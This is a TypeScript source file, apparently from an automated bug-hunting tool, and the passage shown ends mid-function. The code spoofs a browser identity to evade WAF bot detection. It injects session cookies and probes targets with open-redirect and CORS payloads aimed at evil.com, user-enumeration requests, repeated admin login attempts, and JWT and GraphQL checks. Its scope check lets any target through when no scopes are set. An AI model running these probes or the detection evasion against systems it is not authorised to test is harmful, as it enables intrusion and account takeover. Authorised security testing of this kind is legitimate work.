import axios from 'axios';
import axiosRetry from 'axios-retry';
import db from './db.js';
import { v4 as uuidv4 } from 'uuid';
import { StackGapAnalyzer } from './stack_gap_analyzer.js';
import * as cheerio from 'cheerio';
import puppeteer from 'puppeteer-extra';
import StealthPlugin from 'puppeteer-extra-plugin-stealth';
import { OllamaClient } from './ollama_client.js';
import { PayloadOven } from './payload_oven.js';
import { ToolManager } from './tool_manager.js';
import { MemoryManager } from './memory_manager.js';
import { SessionVault, SessionScopeError } from './session_vault.js';
import { AuthFlowVault } from './auth_flow_vault.js';
import { DEFAULT_HTTP_IDENTITY, defaultHttpIdentityHeaderArgs } from './user_agents.js';
import { getSubdomains, getTopUsernames, getTopPasswords } from './seclists.js';
import * as net from 'net';
import * as tls from 'tls';
import { AsyncLocalStorage } from 'async_hooks';

// Configure stealth
puppeteer.use(StealthPlugin());

// Scoped axios instance for recon/discovery probes that benefit from retries.
// The global axios instance is NOT retried — lab proxy, scan runner, and AI
// client use it directly and should not triple traffic on 404s.
const reconAxios = axios.create();
axiosRetry(reconAxios, {
  retries: 2,
  retryDelay: axiosRetry.exponentialDelay,
  retryCondition: (error) => {
    // Only retry on network errors and 5xx, never on 4xx
    return axiosRetry.isNetworkOrIdempotentRequestError(error) ||
      (error.response?.status !== undefined && error.response.status >= 500);
  },
});

// --- Per-job session propagation -----------------------------------------
// AsyncLocalStorage carries the active sessionId for the duration of one
// startJob() invocation. The axios request interceptor below transparently
// merges cookies + auth headers from the bound Session onto every outbound
// call inside the engine — so once the user picks a session, *every* phase
// (recon, fingerprinting, discovery, fuzzing, auth audit) inherits the auth
// material without each call site needing to know about it.
//
// For URLs outside the session's bound scope (third-party OSINT lookups,
// IdP probes, public registry queries) the overlay is skipped and the
// request proceeds unauthenticated rather than failing the whole job.
// `sessionId` is mutable on the shared context object so the on-401 hook
// below can swap in a refreshed session captured by an auth-flow replay
// without interrupting the in-flight phase. `authFlowId` is the flow used
// for those refreshes; once a refresh is in flight we record the promise on
// `refreshing` so concurrent 401s don't kick off N parallel replays.
export interface JobContext {
  sessionId?: string;
  authFlowId?: string;
  jobId?: string;
  refreshing?: Promise<string | null>;
}
export const jobContext = new AsyncLocalStorage<JobContext>();

// --- HTTP client fingerprint ---------------------------------------------
// Auto-Hunter runs over plain axios; without intervention it ships
// `User-Agent: axios/<version>` and zero client-hints, which Akamai /
// Cloudflare / Imperva trivially fingerprint as a non-browser. Layer a
// real Linux Chrome identity (UA + Sec-Ch-Ua family + Accept/Accept-* +
// Sec-Fetch-* navigation triple) onto every outbound request. Probe-side
// payloads that intentionally set a header (e.g. UA-based SQLi, header
// smuggling, security-tool spoofs) are preserved — we never overwrite
// case-insensitively. Registered BEFORE the session overlay so cookies
// and bound auth headers still win on collision.
function applyDefaultIdentity(headers: Record<string, string | undefined>) {
  const set = (k: string, v: string) => {
    const existing = Object.keys(headers).find(h => h.toLowerCase() === k.toLowerCase());
    if (existing && headers[existing] !== undefined && headers[existing] !== '') return;
    headers[k] = v;
  };
  const id = DEFAULT_HTTP_IDENTITY;
  set('User-Agent', id.userAgent);
  set('Accept', id.accept);
  set('Accept-Language', id.acceptLanguage);
  set('Accept-Encoding', id.acceptEncoding);
  set('Sec-Ch-Ua', id.secChUa);
  set('Sec-Ch-Ua-Mobile', id.secChUaMobile);
  set('Sec-Ch-Ua-Platform', id.secChUaPlatform);
  set('Sec-Fetch-Site', id.secFetchSite);
  set('Sec-Fetch-Mode', id.secFetchMode);
  set('Sec-Fetch-User', id.secFetchUser);
  set('Sec-Fetch-Dest', id.secFetchDest);
  set('Upgrade-Insecure-Requests', id.upgradeInsecureRequests);
}

axios.interceptors.request.use((config) => {
  const headers = (config.headers ?? {}) as Record<string, string | undefined>;
  applyDefaultIdentity(headers);
  (config as { headers: unknown }).headers = headers;
  return config;
});

axios.interceptors.request.use((config) => {
  const ctx = jobContext.getStore();
  if (!ctx?.sessionId || !config.url) return config;
  try {
    const merged = SessionVault.applyToHeaders(
      ctx.sessionId,
      config.url,
      (config.headers ?? {}) as Record<string, string>,
    );
    // axios accepts plain object headers; cast keeps both AxiosHeaders
    // and plain-object call sites happy.
    (config as { headers: unknown }).headers = merged;
  } catch (err) {
    if (err instanceof SessionScopeError) {
      // Out-of-scope target (e.g., DNS provider, IdP). Pass through without
      // session material rather than aborting the whole job.
      return config;
    }
    throw err;
  }
  return config;
});

// Mid-hunt auto-refresh: if an in-scope request comes back 401, OR comes
// back 30x with a Location pointing at a /login | /signin | /auth path on
// the same host, replay the bound auth-flow once and retry the request with
// the freshly captured session. A response carrying `_levargAuthRetry` has
// already been retried and is passed through unchanged to avoid loops.
function looksLikeAuthRedirect(status: number, location: string | undefined): boolean {
  if (status < 300 || status >= 400) return false;
  if (!location) return false;
  return /\/(login|signin|sign-in|auth|account\/login)\b/i.test(location);
}

axios.interceptors.response.use(
  (response) => {
    const ctx = jobContext.getStore();
    if (!ctx || !ctx.authFlowId || !response.config.url) return response;
    if ((response.config as { _levargAuthRetry?: boolean })._levargAuthRetry) return response;
    const status = response.status;
    const location = (response.headers?.location ?? response.headers?.Location) as
      | string
      | undefined;
    if (status !== 401 && !looksLikeAuthRedirect(status, location)) return response;

    // Only refresh for in-scope hosts — a 401 from an IdP / OSINT lookup is
    // expected and not actionable.
    let inScope = false;
    try {
      const session = ctx.sessionId ? SessionVault.get(ctx.sessionId) : null;
      const scope = session?.scope_id ? SessionVault.getScope(session.scope_id) : null;
      if (scope) {
        const host = new URL(response.config.url).hostname;
        inScope = SessionVault.hostInScope(host, scope.domain);
      }
    } catch {
      inScope = false;
    }
    if (!inScope) return response;

    const authFlowId = ctx.authFlowId;
    if (!ctx.refreshing) {
      ctx.refreshing = (async () => {
        try {
          const result = await AuthFlowVault.run(authFlowId);
          if (result.ok && result.sessionId) {
            ctx.sessionId = result.sessionId;
            return result.sessionId;
          }
          return null;
        } catch {
          return null;
        } finally {
          ctx.refreshing = undefined;
        }
      })();
    }
    return ctx.refreshing.then(async (newSessionId) => {
      if (!newSessionId) return response;
      // Retry the original request once with the refreshed session applied.
      const cfg = { ...response.config, _levargAuthRetry: true } as typeof response.config & {
        _levargAuthRetry: boolean;
      };
      try {
        const merged = SessionVault.applyToHeaders(
          newSessionId,
          cfg.url ?? '',
          (cfg.headers ?? {}) as Record<string, string>,
        );
        (cfg as { headers: unknown }).headers = merged;
      } catch {
        // If overlay fails for any reason, fall back to original response.
        return response;
      }
      try {
        return await axios.request(cfg);
      } catch {
        return response;
      }
    });
  },
);

const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

function safeJsonParse<T>(text: string | null | undefined, fallback: T): T {
  if (!text) return fallback;
  try {
    return JSON.parse(text) as T;
  } catch {
    return fallback;
  }
}

interface AiVulnResult {
  isVulnerable: boolean;
  confidence: number;
  explanation: string;
  gap_identified: string;
  chain_potential: string | null;
  discovered_user?: string | null;
}

const NULL_VULN: AiVulnResult = { isVulnerable: false, confidence: 0, explanation: '', gap_identified: '', chain_potential: null };

export class AutomationEngine {
  private static wildcardBodies: Map<string, string> = new Map();

  private static wildcardTitles: Map<string, string> = new Map();

  private static activeJobs = 0;

  private static async checkWildcard200(asset: string) {
    try {
      const randomPath = `${asset.endsWith('/') ? asset : asset + '/'}.well-known/random-path-${uuidv4().substring(0, 8)}`;
      const res = await axios.get(randomPath, { timeout: 5000, validateStatus: () => true });
      if (res.status === 200) {
        const body = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
        const hostname = new URL(asset).hostname;
        this.wildcardBodies.set(hostname, body.substring(0, 5000)); // Store first 5k chars
        const title = (body.match(/<title>(.*?)<\/title>/i) || [])[1] || 'No Title';
        this.wildcardTitles.set(hostname, title);
        return true;
      }
    } catch (e) {}
    return false;
  }

  private static isWildcardResponse(hostname: string, body: string) {
    const wildcardBody = this.wildcardBodies.get(hostname);
    const wildcardTitle = this.wildcardTitles.get(hostname);
    if (!wildcardBody) return false;

    const currentTitle = (body.match(/<title>(.*?)<\/title>/i) || [])[1] || 'No Title';
    
    // If titles match and are not "No Title", it's likely a wildcard
    if (wildcardTitle && wildcardTitle !== 'No Title' && currentTitle === wildcardTitle) {
      return true;
    }

    // Similarity check: strip nonces and compare
    const cleanBody = (b: string) => b.replace(/nonce="[^"]*"/g, '').substring(0, 2000);
    return cleanBody(body) === cleanBody(wildcardBody);
  }

  private static async log(jobId: string, level: 'info' | 'warn' | 'error' | 'vuln', message: string, data?: any) {
    db.prepare('INSERT INTO automation_logs (id, job_id, level, message, data) VALUES (?, ?, ?, ?, ?)')
      .run(uuidv4(), jobId, level, message, data ? JSON.stringify(data) : null);
    console.log(`[Job ${jobId}] [${level.toUpperCase()}] ${message}`);
  }

  private static async updateJob(jobId: string, status: string, phase?: string, findings?: any[]) {
    if (phase) {
      db.prepare('UPDATE automation_jobs SET status = ?, phase = ? WHERE id = ?').run(status, phase, jobId);
    } else {
      db.prepare('UPDATE automation_jobs SET status = ? WHERE id = ?').run(status, jobId);
    }
    if (findings) {
      db.prepare('UPDATE automation_jobs SET findings = ? WHERE id = ?').run(JSON.stringify(findings), jobId);
    }
  }

  static getPayloadOvenCategories() {
    return PayloadOven.getAllCategories();
  }

  static getPayloadOvenPayloads(category: string, layer: 1 | 2 | 3, count: number) {
    return PayloadOven.getPayloads(category, layer, count);
  }

  static selectFuzzableEndpoints(endpoints: {url: string, method: string}[], limit: number = 50) {
    const scored = endpoints.map(ep => {
      let score = 0;
      const url = ep.url.toLowerCase();
      if (url.includes('?')) score += 50;
      if (['POST', 'PUT', 'PATCH'].includes(ep.method.toUpperCase())) score += 40;
      const keywords = { 'admin': 30, 'api': 25, 'login': 20, 'auth': 20, 'user': 15, 'config': 25, 'debug': 35 };
      for (const [kw, val] of Object.entries(keywords)) { if (url.includes(kw)) score += val; }
      return { ...ep, score };
    });
    return scored.sort((a, b) => b.score - a.score).slice(0, limit);
  }

  private static async auditAuthenticationFlow(jobId: string, asset: string, tech: string[], ai: OllamaClient | null) {
    const hostname = new URL(asset).hostname;
    const memory = MemoryManager.getMemory(jobId, hostname);
    
    const authKeywords = ['auth', 'login', 'sso', 'saml', 'oauth', 'cognito', 'okta', 'auth0', 'firebase', 'jwt', 'token', 'session', 'cookie'];
    if (!tech.some(t => authKeywords.some(kw => t.toLowerCase().includes(kw)))) return;

    this.log(jobId, 'info', `Phase 4a: Authentication Flow Auditor for ${asset}`);

    // --- 4a-1: OAuth/SSO State CSRF Check ---
    try {
      const res = await axios.get(asset, { maxRedirects: 5, timeout: 10000, validateStatus: () => true });
      const currentUrl = res.request?._redirectable?._currentUrl || '';
      const state = currentUrl.match(/(?:state|RelayState|nonce)=([^&]+)/);
      const clientId = currentUrl.match(/client_id=([^&]+)/);
      const redirectUri = currentUrl.match(/redirect_uri=([^&]+)/);
      
      if (clientId) MemoryManager.addIdentifier(jobId, hostname, 'client_id', clientId[1]);
      if (redirectUri) MemoryManager.addIdentifier(jobId, hostname, 'redirect_uri', decodeURIComponent(redirectUri[1]));
      
      if (state && ai) {
        const stateParam = currentUrl.includes('RelayState=') ? 'RelayState' : currentUrl.includes('nonce=') ? 'nonce' : 'state';
        const callbackUrl = currentUrl.split('?')[0];
        const testUrl = `${callbackUrl}?code=test_code&${stateParam}=attack_state`;
        const csrfRes = await axios.get(testUrl, { timeout: 5000, validateStatus: () => true });
        
        const analysisPrompt = `As an autonomous security agent (argila), analyze this Authentication Flow interaction for ${hostname}.
        Target URL: ${testUrl}
        Original Redirect URL: ${currentUrl}
        Response Status: ${csrfRes.status}
        Response Body (truncated): ${typeof csrfRes.data === 'string' ? csrfRes.data.substring(0, 1000) : JSON.stringify(csrfRes.data).substring(0, 1000)}
        
        [CRITICAL CONTEXT - TECH STACK]: ${memory.tech.join(', ')}
        [CRITICAL CONTEXT - IDENTIFIERS]: ${JSON.stringify(memory.identifiers)}
        Memory of Target Behavior:
        - Previous Findings: ${JSON.stringify(memory.findings)}
        
        Determine if the application is vulnerable to OAuth/SSO State CSRF (Pre-Auth Account Takeover).
        Chaining Logic: Can this finding be combined with previous identifiers or users to escalate impact?
        Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "chain_potential": string | null }`;

        const analysis = safeJsonParse<AiVulnResult>(await ai.generate(analysisPrompt, true), NULL_VULN);
        this.log(jobId, 'info', `Auth CSRF check for ${asset}: ${analysis.isVulnerable ? 'VULNERABLE' : 'CLEAN'} (${analysis.confidence})`);
        if (analysis.isVulnerable && analysis.confidence > 0.8) {
          this.log(jobId, 'vuln', `CONFIRMED AUTH CSRF: ${analysis.gap_identified}`, { explanation: analysis.explanation, chain: analysis.chain_potential });
          MemoryManager.addFinding(jobId, hostname, { type: 'Auth CSRF', asset, gap: analysis.gap_identified, chain: analysis.chain_potential });
        }
      }

      // --- 4a-1b: Open Redirect on redirect_uri ---
      if (redirectUri) {
        const decoded = decodeURIComponent(redirectUri[1]);
        const attackRedirects = [
          decoded.replace(/^(https?:\/\/)[^/]+/, '$1evil.com'),
          decoded + '.evil.com',
          decoded.replace(/\/$/, '') + '@evil.com',
        ];
        for (const attackUri of attackRedirects) {
          try {
            const testUrl = currentUrl.replace(redirectUri[1], encodeURIComponent(attackUri));
            const openRedirRes = await axios.get(testUrl, { maxRedirects: 0, timeout: 5000, validateStatus: () => true });
            const location = openRedirRes.headers['location'] || '';
            if (location.includes('evil.com')) {
              this.log(jobId, 'vuln', `CONFIRMED OPEN REDIRECT on redirect_uri: ${asset}`, { payload: attackUri, location });
              MemoryManager.addFinding(jobId, hostname, { type: 'Open Redirect', asset, gap: 'OAuth redirect_uri allows arbitrary domain', chain_potential: 'Token theft via controlled redirect' });
              break;
            }
          } catch {}
        }
      }
    } catch (e) {
      this.log(jobId, 'warn', `Auth CSRF check failed for ${asset}: ${(e as Error).message}`);
    }

    // --- 4a-2: User Enumeration via Auth Endpoints ---
    const knownUser = memory.discoveredUsers[0] || 'admin';
    const randomUser = `user-${Math.random().toString(36).substring(7)}@example.com`;
    
    const enumEndpoints = [
      { url: '/forgot-password', method: 'POST', body: { email: knownUser }, altBody: { email: randomUser } },
      { url: '/api/auth/reset', method: 'POST', body: { username: knownUser }, altBody: { username: randomUser } },
      { url: '/api/auth/login', method: 'POST', body: { username: knownUser, password: 'invalid' }, altBody: { username: randomUser, password: 'invalid' } },
      { url: '/api/v1/auth/login', method: 'POST', body: { email: knownUser, password: 'invalid' }, altBody: { email: randomUser, password: 'invalid' } },
      { url: '/login', method: 'POST', body: { username: knownUser, password: 'invalid' }, altBody: { username: randomUser, password: 'invalid' } },
      { url: '/api/users/check', method: 'POST', body: { email: knownUser }, altBody: { email: randomUser } },
      { url: '/register', method: 'POST', body: { email: knownUser, password: 'Test12345!' }, altBody: { email: randomUser, password: 'Test12345!' } },
    ];

    for (const endpoint of enumEndpoints) {
      try {
        const [res1, res2] = await Promise.all([
          axios({ method: endpoint.method, url: `${asset}${endpoint.url}`, data: endpoint.body, timeout: 5000, validateStatus: () => true }),
          axios({ method: endpoint.method, url: `${asset}${endpoint.url}`, data: endpoint.altBody, timeout: 5000, validateStatus: () => true })
        ]);
        
        const isStatusDiff = res1.status !== res2.status;
        const body1 = typeof res1.data === 'string' ? res1.data : JSON.stringify(res1.data);
        const body2 = typeof res2.data === 'string' ? res2.data : JSON.stringify(res2.data);
        // Strict body equality is too loose: nearly every response differs by a
        // CSRF token / request id / timestamp. Require either a meaningful size
        // delta or a divergence in user-existence error markers, plus we still
        // count any HTTP status difference and an x-response-time timing oracle.
        const sizeDiff = Math.abs(body1.length - body2.length);
        const enumMarkerRe = /(?:user|account|email|username)[^.\n]{0,40}(?:not\s*found|does\s*not\s*exist|already\s*(?:exists|registered|in[-\s]?use|taken)|invalid|unknown|no\s*such)\b|\bno\s*such\s+(?:user|account|email|username)\b|\b(?:invalid|unknown)\s+(?:user|account|email|username)\b/i;
        const m1 = enumMarkerRe.test(body1);
        const m2 = enumMarkerRe.test(body2);
        const markerDiffers = m1 !== m2;
        const isBodyDiff = sizeDiff > 200 || markerDiffers;
        const isTimingDiff = Math.abs((res1.headers['x-response-time'] ? parseInt(res1.headers['x-response-time'] as string) : 0) - (res2.headers['x-response-time'] ? parseInt(res2.headers['x-response-time'] as string) : 0)) > 200;

        if ((isStatusDiff || isBodyDiff || isTimingDiff) && ai) {
          const analysisPrompt = `Analyze these authentication responses for User Enumeration.
          Endpoint: ${endpoint.url} | Method: ${endpoint.method}
          
          Response 1 (User: ${JSON.stringify(endpoint.body)}): Status: ${res1.status} | Body: ${body1.substring(0, 1000)}
          Response 2 (User: ${JSON.stringify(endpoint.altBody)}): Status: ${res2.status} | Body: ${body2.substring(0, 1000)}
          
          [CONTEXT]: Tech: ${memory.tech.join(', ')} | Identifiers: ${JSON.stringify(memory.identifiers)} | Previous: ${JSON.stringify(memory.findings)}
          
          Determine if response difference reveals user existence. Check status codes, error messages, timing, and response body differences.
          Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "discovered_user": string | null, "chain_potential": string | null }`;

          const analysis = safeJsonParse<AiVulnResult>(await ai.generate(analysisPrompt, true), NULL_VULN);
          if (analysis.isVulnerable && analysis.confidence > 0.8) {
            this.log(jobId, 'vuln', `CONFIRMED USER ENUMERATION: ${analysis.gap_identified}`, { explanation: analysis.explanation, chain: analysis.chain_potential });
            MemoryManager.addFinding(jobId, hostname, { type: 'User Enumeration', asset, gap: analysis.gap_identified, chain: analysis.chain_potential });
            if (analysis.discovered_user) MemoryManager.addDiscoveredUser(jobId, hostname, analysis.discovered_user);
          }
        }
      } catch {}
    }

    // --- 4a-3: CORS Misconfiguration Audit ---
    // Real CORS gaps: reflected attacker origin + credentials. ACAO=* on a
    // public endpoint is by-design (CDN assets, public APIs); flagging it
    // produced FPs on every static-asset host. Two real-vuln shapes:
    //   1. ACAO echoes attacker Origin verbatim → trust-boundary leak.
    //   2. ACAO=null with ACAC=true → null-origin trust (sandboxed iframes).
    this.log(jobId, 'info', `Phase 4a: CORS Misconfiguration Audit for ${asset}`);
    const corsOrigins = [
      `https://evil.com`,
      `https://${hostname}.evil.com`,
      `https://evil-${hostname}`,
      `null`,
      `https://${hostname}%60.evil.com`,
    ];
    for (const origin of corsOrigins) {
      try {
        const res = await axios.get(asset, {
          timeout: 5000,
          validateStatus: () => true,
          headers: { 'Origin': origin }
        });
        const acao = res.headers['access-control-allow-origin'];
        const acac = res.headers['access-control-allow-credentials'];
        // Drop ACAO=* — CORS spec forbids credentials on wildcard, so it's
        // only a finding on a path that requires auth. We don't know that
        // here without a session, so ignore.
        if (acao !== origin) continue;
        // Reflected attacker origin. Severity scales with credentials and
        // null-origin behavior.
        const credentialed = acac === 'true';
        const severity = credentialed ? 'CRITICAL' : (origin === 'null' ? 'HIGH' : 'MEDIUM');
        this.log(jobId, 'vuln', `CORS Misconfiguration (${severity}): ${asset} reflects origin ${origin}`, { acao, acac, origin });
        MemoryManager.addFinding(jobId, hostname, {
          type: 'CORS Misconfiguration',
          asset,
          gap: `Reflects arbitrary origin ${origin}${credentialed ? ' with credentials' : ''}`,
          chain_potential: credentialed ? 'Full session hijack via cross-origin credential theft' : 'Data leakage via cross-origin reads'
        });
        break;
      } catch {}
    }

    // --- 4a-4: JWT/Token Weakness Audit ---
    this.log(jobId, 'info', `Phase 4a: JWT/Token Audit for ${asset}`);
    try {
      const loginRes = await axios.get(asset, { timeout: 5000, validateStatus: () => true });
      const bodyStr = typeof loginRes.data === 'string' ? loginRes.data : JSON.stringify(loginRes.data);
      const cookies = Array.isArray(loginRes.headers['set-cookie']) ? loginRes.headers['set-cookie'].join('; ') : (loginRes.headers['set-cookie'] || '');

      // Check for JWT in response body or cookies
      const jwtPattern = /eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g;
      const jwts = [...(bodyStr.match(jwtPattern) || []), ...(cookies.match(jwtPattern) || [])];
      
      for (const jwt of [...new Set(jwts)].slice(0, 3)) {
        try {
          const parts = jwt.split('.');
          const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
          const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());

          const issues: string[] = [];
          if (header.alg === 'none' || header.alg === 'None') issues.push('Algorithm "none" — signature bypass');
          if (header.alg === 'HS256' && header.jwk) issues.push('JWK embedded in header — potential key confusion');
          if (!payload.exp) issues.push('No expiration claim — token never expires');
          if (payload.exp && payload.iat && payload.exp - payload.iat > 86400 * 30) issues.push('Token lifetime > 30 days');
          if (payload.admin === true || payload.role === 'admin') issues.push('Privileged claims in token — test for forgery');

          if (issues.length > 0) {
            this.log(jobId, 'vuln', `JWT WEAKNESS on ${asset}: ${issues.join('; ')}`, { header, payloadClaims: Object.keys(payload) });
            MemoryManager.addFinding(jobId, hostname, {
              type: 'JWT Weakness',
              asset,
              gap: issues.join('; '),
              chain_potential: issues.some(i => i.includes('none') || i.includes('forgery')) ? 'Authentication bypass via token forgery' : 'Session persistence abuse'
            });
          }
        } catch {}
      }

      // --- 4a-5: Session Cookie Security Audit ---
      // Filter on cookie NAME, not free-text match against the cookie line.
      // The old `auth|sid|jwt` regex matched value content (e.g. an OAuth
      // state cookie containing the word "auth" in its base64 payload).
      // Also exclude cookies that are intentionally readable by JS (CSRF
      // double-submit tokens) or owned by the WAF/CDN (Akamai bm_*, CF cf_*
      // — server cannot set HttpOnly on those without breaking JS APIs).
      if (cookies) {
        const cookieIssues: string[] = [];
        const cookieEntries = cookies.split(/,(?=\s*\w+=)/);
        const isSessionCookieName = (name: string): boolean => {
          const n = name.toLowerCase();
          // Known double-submit CSRF tokens: must be JS-readable by design
          if (n.includes('csrf') || n.includes('xsrf')) return false;
          // Akamai/Cloudflare bot-manager cookies: vendor-controlled
          if (/^(bm_|_cf_|cf_|ak_)/i.test(name)) return false;
          // Analytics: not security-sensitive
          if (/^(_ga|_gid|_gtm|_fbp|_hjid)/i.test(name)) return false;
          // True session-cookie name patterns
          return /^(session|sess|sid|jsessionid|phpsessid|connect\.sid|laravel_session|asp\.?net|fastsessionid|auth_?token|access_?token|refresh_?token|jwt|bearer)/i.test(name);
        };
        for (const cookie of cookieEntries) {
          const name = cookie.split('=')[0].trim();
          if (!isSessionCookieName(name)) continue;
          const lc = cookie.toLowerCase();
          if (!lc.includes('httponly')) cookieIssues.push(`Missing HttpOnly: ${name}`);
          if (!lc.includes('secure') && asset.startsWith('https')) cookieIssues.push(`Missing Secure flag: ${name}`);
          if (!lc.includes('samesite')) cookieIssues.push(`Missing SameSite: ${name}`);
        }
        if (cookieIssues.length > 0) {
          this.log(jobId, 'vuln', `SESSION COOKIE ISSUES on ${asset}: ${cookieIssues.length} finding(s)`, { issues: cookieIssues });
          MemoryManager.addFinding(jobId, hostname, {
            type: 'Insecure Session Cookie',
            asset,
            gap: cookieIssues.join('; '),
            chain_potential: 'Session hijack via XSS (missing HttpOnly) or CSRF (missing SameSite)'
          });
        }
      }
    } catch {}

    // --- 4a-6: Security Header Audit ---
    // Don't double-count CSP frame-ancestors as missing X-Frame-Options.
    // Modern best practice replaces XFO with CSP frame-ancestors; flagging
    // both produces noise on properly-configured sites.
    this.log(jobId, 'info', `Phase 4a: Security Header Audit for ${asset}`);
    try {
      const res = await axios.get(asset, { timeout: 5000, validateStatus: () => true });
      const headers = res.headers;
      const missingHeaders: string[] = [];

      const csp = String(headers['content-security-policy'] ?? '');
      const cspHasFrameAncestors = /frame-ancestors\s+/i.test(csp);

      if (!headers['strict-transport-security'] && asset.startsWith('https')) missingHeaders.push('HSTS');
      if (!headers['x-content-type-options']) missingHeaders.push('X-Content-Type-Options');
      if (!headers['x-frame-options'] && !cspHasFrameAncestors) missingHeaders.push('X-Frame-Options');
      if (!csp) missingHeaders.push('CSP');

      if (missingHeaders.length > 0) {
        this.log(jobId, 'warn', `Missing security headers on ${asset}: ${missingHeaders.join(', ')}`);
        MemoryManager.addFinding(jobId, hostname, {
          type: 'Missing Security Headers',
          asset,
          gap: `Missing: ${missingHeaders.join(', ')}`,
          chain_potential: missingHeaders.includes('CSP') ? 'XSS exploitation easier without CSP' : null
        });
      }
    } catch {}
  }

  private static async auditBusinessLogic(jobId: string, asset: string, tech: string[], ai: OllamaClient | null) {
    const hostname = new URL(asset).hostname;
    const memory = MemoryManager.getMemory(jobId, hostname);
    
    const bizKeywords = ['shop', 'store', 'cart', 'checkout', 'price', 'shopify', 'magento', 'stripe', 'woocommerce', 'bigcommerce', 'payment', 'order', 'invoice'];
    if (!tech.some(t => bizKeywords.some(kw => t.toLowerCase().includes(kw)))) return;

    this.log(jobId, 'info', `Phase 4a: Business Logic Auditor for ${asset}`);

    // 1. Price/Logic Integrity Check — expanded endpoints
    const logicEndpoints = [
      '/products.json', '/api/v1/products', '/cart.js', '/cart.json',
      '/api/cart', '/api/v1/cart', '/api/checkout', '/api/v1/orders',
      '/collections.json', '/api/products', '/api/v2/products'
    ];
    for (const ep of logicEndpoints) {
      try {
        const res = await axios.get(`${asset}${ep}`, { timeout: 5000, validateStatus: () => true });
        const isJson = String(res.headers['content-type'] ?? '').includes('application/json');
        const bodyStr = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
        const hasProductMarkers = bodyStr.includes('price') || bodyStr.includes('variant') || bodyStr.includes('sku') || bodyStr.includes('amount') || bodyStr.includes('total');

        if (isJson && hasProductMarkers && ai) {
          const analysisPrompt = `Analyze this e-commerce data for Business Logic flaws on ${hostname}.
          Endpoint: ${ep}
          Response Body (truncated): ${bodyStr.substring(0, 2000)}
          
          [CONTEXT]: Tech: ${memory.tech.join(', ')} | Identifiers: ${JSON.stringify(memory.identifiers)} | Findings: ${JSON.stringify(memory.findings)}
          
          Look for: price manipulation, negative quantities, hidden discount codes, coupon stacking, race conditions, logic bypasses, internal pricing data exposure.
          Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "chain_potential": string | null }`;

          const analysis = safeJsonParse<AiVulnResult>(await ai.generate(analysisPrompt, true), NULL_VULN);
          if (analysis.isVulnerable && analysis.confidence > 0.8) {
            this.log(jobId, 'vuln', `CONFIRMED BUSINESS LOGIC FLAW: ${analysis.gap_identified}`, { explanation: analysis.explanation, chain: analysis.chain_potential });
            MemoryManager.addFinding(jobId, hostname, { type: 'Business Logic Flaw', asset, gap: analysis.gap_identified, chain: analysis.chain_potential });
          }
        }
      } catch {}
    }

    // 2. GraphQL Introspection Check
    try {
      const gqlEndpoints = ['/graphql', '/api/graphql', '/v1/graphql', '/gql'];
      for (const gqlEp of gqlEndpoints) {
        try {
          const introspectionRes = await axios.post(`${asset}${gqlEp}`, {
            query: '{ __schema { types { name fields { name } } } }'
          }, { timeout: 5000, validateStatus: () => true });
          const bodyStr = typeof introspectionRes.data === 'string' ? introspectionRes.data : JSON.stringify(introspectionRes.data);
          if (introspectionRes.status === 200 && bodyStr.includes('__schema')) {
            this.log(jobId, 'vuln', `GRAPHQL INTROSPECTION ENABLED: ${asset}${gqlEp}`, { schemaPreview: bodyStr.substring(0, 500) });
            MemoryManager.addFinding(jobId, hostname, {
              type: 'GraphQL Introspection',
              asset: `${asset}${gqlEp}`,
              gap: 'GraphQL introspection enabled — full schema disclosure',
              chain_potential: 'Map all queries/mutations for targeted exploitation'
            });
            break;
          }
        } catch {}
      }
    } catch {}

    // 3. Rate Limit / Account Lockout Check
    try {
      const loginEndpoints = ['/api/auth/login', '/login', '/api/v1/auth/login'];
      for (const ep of loginEndpoints) {
        let lastStatus = 0;
        let rateLimited = false;
        for (let i = 0; i < 10; i++) {
          try {
            const res = await axios.post(`${asset}${ep}`, {
              username: 'admin', password: `wrong-pass-${i}`
            }, { timeout: 3000, validateStatus: () => true });
            lastStatus = res.status;
            if (res.status === 429 || res.status === 403) { rateLimited = true; break; }
          } catch { break; }
        }
        if (!rateLimited && lastStatus > 0 && lastStatus !== 404) {
          this.log(jobId, 'vuln', `NO RATE LIMITING on ${asset}${ep} — 10 failed logins accepted`, { lastStatus });
          MemoryManager.addFinding(jobId, hostname, {
            type: 'Missing Rate Limit',
            asset: `${asset}${ep}`,
            gap: 'No rate limiting or account lockout on login endpoint',
            chain_potential: 'Brute-force attack viable with discovered usernames'
          });
          break;
        }
      }
    } catch {}
  }

  static async startJob(
    targetUrl: string,
    options: { sessionId?: string; authFlowId?: string } = {},
  ): Promise<string> {
    if (this.activeJobs >= 2) {
      throw new Error('Maximum concurrent jobs (2) reached. Please wait for a job to complete.');
    }
    this.activeJobs++;
    const jobId = uuidv4();
    const sessionId = options.sessionId;
    const authFlowId = options.authFlowId;
    const ollamaAvailable = await OllamaClient.isAvailable();
    const ai = ollamaAvailable ? new OllamaClient() : null;
    
    // Check Scope
    const scopes = db.prepare('SELECT domain FROM scopes').all() as { domain: string }[];
    const isAllowed = scopes.some(s => {
      try {
        const targetHost = new URL(targetUrl).hostname;
        return targetHost === s.domain || targetHost.endsWith(`.${s.domain}`);
      } catch (e) {
        return false;
      }
    });
    if (scopes.length > 0 && !isAllowed) {
      throw new Error('Target domain not in scope');
    }

    db.prepare('INSERT INTO automation_jobs (id, target_url, status, phase) VALUES (?, ?, ?, ?)')
      .run(jobId, targetUrl, 'running', 'Phase 1: Reconnaissance');

    this.log(jobId, 'info', `Initialized Professional Methodology Hunt on ${targetUrl}`);
    if (sessionId) {
      this.log(jobId, 'info', `Authenticated session bound to job; cookies + auth headers will permeate all phases.`);
    }
    if (authFlowId) {
      this.log(jobId, 'info', `Auth flow ${authFlowId} bound to job; will auto-refresh session on 401 / login redirect.`);
    }

    setTimeout(() => {
      // Run the entire hunt under a per-job AsyncLocalStorage context so the
      // axios interceptor can apply the session overlay to every outbound
      // call below — including those made transitively by helper modules
